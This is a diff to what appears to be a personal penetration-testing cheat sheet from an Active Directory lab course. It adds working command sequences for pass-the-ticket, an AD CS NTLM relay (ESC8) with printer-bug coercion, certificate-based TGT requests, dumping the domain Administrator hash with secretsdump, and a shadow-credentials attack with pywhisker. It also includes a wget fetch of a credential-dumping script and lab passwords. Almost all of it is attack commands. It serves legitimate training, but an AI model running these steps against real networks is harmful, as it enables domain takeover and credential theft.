@@ -704,21 +704,58 @@ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
 # Impersonating a user with a KeyTab
 kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
 
-# Impacket Ticket converter file ccache to kirbi
+# Setting the KRB5CCNAME environment variable
+export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
+
+# Impacket Ticket converter file ccache to kirbi  ( https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py) 
 impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
 
 # Importing converted ticket into Windows session with Rubeus
 C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
 
-# using Linikatz tool to  exploiting credentials on Linux machines when there is an integration with Active Directory 
+# using Linikatz tool to  exploiting credentials on Linux machines when there is an integration with Active Directory   ( https://github.com/CiscoCXSecurity/linikatz ) 
 wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
 /opt/linikatz.sh
 
 ```
 ##### Pass the Certificate
 ```
-# Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.
-office2john.py Protected.docx > protected-docx.hash 
+(AD CS NTLM Relay Attack (ESC8)) 
+# use Impacket’s ntlmrelayx to listen for inbound connections and relay them to the web enrollment service ( relay NTLM authenticate and get file certificate .pfx ) 
+impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+
+# force machine accounts to authenticate against arbitrary hosts is by exploiting the printer bug
+python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
+
+# install gettgtpkinit.py  and setting environment
+git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
+python3 -m venv .venv
+source .venv/bin/activate
+pip3 install -r requirements.txt
+pip3 install -I git+https://github.com/wbond/oscrypto.git
+
+#  perform a Pass-the-Certificate attack to obtain a TGT by file certificate .pfx and save to file .ccache
+python3 gettgtpkinit.py -cert-pfx DC01$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
+
+# Once successfully obtain a TGT, next perform Pass-the-Ticket (PtT) to dump all hash  ( machine account DC01$ have priv same Domain Admins)
+export KRB5CCNAME=/tmp/dc.ccache
+impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+
+(Shadow Credentials (msDS-KeyCredentialLink))
+# use pywhisker to generates an X.509 certificate and writes the public key to the victim user's msDS-KeyCredentialLink attribute ( https://github.com/ShutdownRepo/pywhisker ) 
+pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add 
+
+# In the command above, we can see that a PFX (PKCS12) file was created (eFUVVTPf.pfx), and the password is shown. We will use this file with gettgtpkinit.py to acquire a TGT as the victim
+python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+
+# With the TGT obtained, we may once again pass the ticket
+export KRB5CCNAME=/tmp/jpinkman.ccache
+klist
+
+# When pkinit disable , read below 
+https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html
+
+https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
 ```
 ## Attacking Common Services
 
